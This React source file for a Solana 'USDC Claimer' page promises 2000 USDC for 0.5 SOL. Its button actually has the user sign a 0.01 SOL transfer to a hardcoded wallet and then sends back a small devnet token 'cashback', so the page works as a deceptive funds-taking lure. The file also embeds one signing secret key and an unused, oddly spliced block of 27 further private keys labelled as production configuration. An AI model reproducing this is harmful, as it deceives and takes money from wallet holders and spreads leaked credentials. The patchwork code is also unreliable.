/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2c5xg2ZJbSZLCxoVpS6NmJ42xxwn4FynvieGvCFMECEdCWAwB35P8FypFMPSXy58hCJepp4p4sEFezCGGJqUJivE"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3htWTrKYW6PXX3EVkL9Bwj5UPSQcS4BGGhCHrTFnh3TKz9jENN3DcDXXQJyD3SXswvkktDe6JeDshHagh2WBX1q8",
  "key1": "3Y8iTP689jGeHqCCvwDA86gaQRndRWmWZuMRJ6Wsz4nSUvG1BbYzTDVSqya777EcV1kcFykEfuykwuT1WyZQPaTf",
  "key2": "5HHyaKRw8iYfm3N7DKQKybRCvE4NP9TV8d7mgFnUzp2Mgjjv9n9mPDAEWrazjgmAaFTZq88ZVnPUv3EjYVuRTEPd",
  "key3": "27qeezHM1RvJ81jK6ACcwmxqraykPPxbppFHGhepZkHFcHZDgxK7yL6YdPaKWvAGdnDS1BXzc2x3haQW9Z9Xozqu",
  "key4": "3WCXgaPfjKnbwLUVHctpCXwrwP6MGNLQVJ8BPggHSedRoMUeWioUnd9jH4wW7pCTL778r2pMgf33dCqWCWaHL6jE",
  "key5": "28jYa1sbKNarzPg6JHKHV9hE5gWeubBRtPQrNLiiRvPZDtNHLfhrYiyr3iLWKTkg3yPkim3epgTvraHDpDZetaGX",
  "key6": "2cMxecstXBPifGUuTdVUxGbHPGvHJiq7kbRoExkHmUEy5UiQryefcJdrX4hzyyLUP5mHEfukcGAbPt1yKXeD6uYw",
  "key7": "2MAHWQWtnFemJW6TyTjueamxzAc8zFSbL252TAT2YfNvCTihLQGX5PZN39v8srKJptFVfHPAi2hFR5NhAyiPzvKi",
  "key8": "3NQrLcHWKVqd6CRJNQEmaTr4b6R7rWY2DFiKfBSjTmPZv3YYTVHVGa1kipPcNEbFFL3QM26BvkRhmAzVX9jamstQ",
  "key9": "2iVYdg6yPJ8LPYcumyUZRKmWomMZcthcFyNSVN1YJKdWdBxfFUGqbtFxwhB12c5oFCgYyvP7SXv8txFP5aNwUmqH",
  "key10": "2LusfsUr1Ue6xrZHoVcdJrVWC1i92w39HRnabQEcgQsskytRjN7xAhFhcU9tuhWzkwVAPapagSbCxXeiBFfJ29n3",
  "key11": "31X62tSFLJ9cLk4G5Ff8vE1XYNoM2ZMiE3QgNcL4nQLuxL1iHtEBjPhsY3Vat6s1sAn9ekLLT39hxi4KxmpddMmD",
  "key12": "4Ntt2t1NxrtqXa7qjpgBeS2czUiPoiqiGQczhVRq2BQwxhLBcLU1gv7H3asFM7SMCrHyzoKP6EkDeRCpGSZhcAmq",
  "key13": "3B29WCaf4ZYBD3kWKgpEuh8qgZuL9KFM8rFzgiT6eTWcoBBtDTTJuRRnPdbWpDfSusqKXaF6f7eA2XjWtqYtgofJ",
  "key14": "3a43Nf6ffvJaaN73viphDRwX9MkXtNDq3xkZS13xgPmiqDTywWni5MweZqVHgQUAmi8BM5yCrFyqPDoByJCZRyLb",
  "key15": "jRnZfAQMizF42TUSJQFTFMDwycpo12NUP5mmWC5Crfk9PnuMzqmmEKxrUxzWVNFhaXEreJ4mAFKyBR1WodPmdKG",
  "key16": "3JDsoKjTnH7xo89yDe6ZNzDDTgjUTZvxGmiN2gyEmJAFriKvDMFPoTyviwjYTrBpuxhWHAXJNqx2ZvabD4xQCAqb",
  "key17": "4QvTrHEJqZz8KF5zx2kq468orFekxaCsLYqAqHY6jW8XDLHJf3MrYMfNpZFW6YiDmJtNH1xiBRSZR2DcRM72ce57",
  "key18": "5f5FG2NNsFZXRmHafZCD1YFGxNKfv5c8Sm7pVmfoGf4j9bPr9VSRe5q8nFfoZMEgrLhsuTgaiwnbMSGfCSpArms9",
  "key19": "53iDGG6UChNUKqVQkyj1bSWEXYRA1M28kjv1WV61pnPN8mGiCk8ZbyjXdBTfYcKaLzTFCfiAJWnvAdaXYU2ffsQC",
  "key20": "K9VK27uz1QkHrcwtkNGpUjSmi2eDev46NxVdYYkdsQrnnFPS5brQF56Q93Xj1c88wGuBNmH2Xv1DoSzugEMyrNn",
  "key21": "4G5vw8b8TXaMc1PAzmmWDRy62dNoJ9q9vKvQSCzX9g9Wkd93ECvUiE8gqgGJERkgUAsykghyJhV68sUKy3DfJXDT",
  "key22": "2krK8UsQqLZVZ5RqNWihLpKFvY6XJUrnBEbzuYvBSMqzTLn1AERb7mKtBBeejwPqHt1h91Vq4ukQjWmJissvMt3U",
  "key23": "2DZTXH3yk32a4xU9yQYAPjvF6sFEG4cKZVndPEprfn2ekSq61c8ZNJK5v9445n9zWVVEqqL4avvhAAdUMVQaXThV",
  "key24": "4aANYGVnmR62aGhVdoGRsFXNkerG7jHxTcnnSdzamjhVyX3a7VsCSRGTb4vY3F5QnG5xvrXC8ejdc7Hio3LYHSj6",
  "key25": "RdJeufh6UawB4vcS4tFrrghi7eVDM1akBB4Dm4BFcvwLGdPz79tbjHMmquGA2cGQmPgfzhYEyrY9tN9mDtWKbMa",
  "key26": "4PJEnGE8Ssb3HoXP6qxKk2T1QzrDzKsrTNDknjDZipWiSVCuqcZNX5hpLsHRNnMPz921XT3uUEmrHVEadr54bke2"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
